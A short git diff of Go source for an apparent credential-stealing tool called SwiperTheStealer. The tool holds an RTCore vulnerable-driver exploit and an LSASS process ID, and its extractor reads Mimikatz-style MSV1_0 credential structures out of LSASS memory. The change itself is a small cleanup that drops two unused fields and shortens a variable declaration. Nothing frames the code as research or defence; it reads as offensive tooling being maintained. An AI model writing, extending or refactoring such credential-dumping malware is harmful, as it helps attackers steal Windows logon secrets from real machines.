@@ -114,8 +114,6 @@ type SwiperTheStealer struct {
 	rtcore         *byovd.RTCoreExploit
 	logger         *logger.Logger
 	lsassPID       uint32
-	lsasrvBase     uint64
-	lsasrvSize     uint32
 	decryptionKeys *byovd.DecryptionKeys
 }
 
@@ -1054,8 +1052,7 @@ func (mpce *MultiPackageCredentialExtractor) extractCredentialsFromMSV1Session(s
 				break
 			}
 
-			var creds KIWI_MSV1_0_CREDENTIALS
-			creds = *(*KIWI_MSV1_0_CREDENTIALS)(unsafe.Pointer(&credData[0]))
+			creds := *(*KIWI_MSV1_0_CREDENTIALS)(unsafe.Pointer(&credData[0]))
 
 			// Extract primary credentials
 			if creds.PrimaryCredentials != 0 {
